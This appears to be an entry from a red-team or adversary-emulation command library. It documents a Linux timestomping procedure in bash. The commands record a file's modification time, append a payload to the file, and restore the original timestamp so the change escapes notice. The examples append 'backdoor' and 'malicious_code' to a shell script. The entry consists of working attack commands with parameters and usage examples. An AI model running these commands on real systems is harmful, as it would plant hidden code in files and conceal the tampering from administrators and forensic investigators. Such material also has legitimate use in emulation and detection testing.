---
id: f0cb2025-7799-4b4b-945c-ec0a14e48e36
name: stat-get-mtime-modify-file-restore-timestamp
type: command
executor: bash
data: |-
  MODIFIED_TS=$(stat --format="%Y" $_FILE_NAME)
  echo "$_PAYLOAD" >> $_FILE_NAME
  touch -a -m -d @$MODIFIED_TS $_FILE_NAME
output: null
created_at: '2023-04-06T03:56:17.808773+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - timestomping
  - file-modification
verified: true
validated: true
---

# stat-get-mtime-modify-file-restore-timestamp

## Command

```bash
MODIFIED_TS=$(stat --format="%Y" $_FILE_NAME)
echo "$_PAYLOAD" >> $_FILE_NAME
touch -a -m -d @$MODIFIED_TS $_FILE_NAME
```

## Description

Captures the current mtime, appends a payload to the file, and restores the original mtime to hide the modification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --format="%Y" | Output mtime as epoch | Built-in |
| $_FILE_NAME | Target file | Yes |
| $_PAYLOAD | Content to append (e.g., backdoor code) | Yes |
| @$MODIFIED_TS | Restored epoch timestamp | Derived |

## Examples

### Basic Usage

```bash
MODIFIED_TS=$(stat --format="%Y" example)
echo "backdoor" >> example
touch -a -m -d @$MODIFIED_TS example
```

### Advanced Usage

```bash
MODIFIED_TS=$(stat --format="%Y" script.sh)
cat malicious_code >> script.sh
touch -a -m -d @$MODIFIED_TS script.sh
```

## Expected Output

`echo` outputs the payload to stdout if not redirected. Post-execution, `stat example` shows original mtime unchanged.

## Related

- [[procedures/Linux-Timestomping-Evasion]]
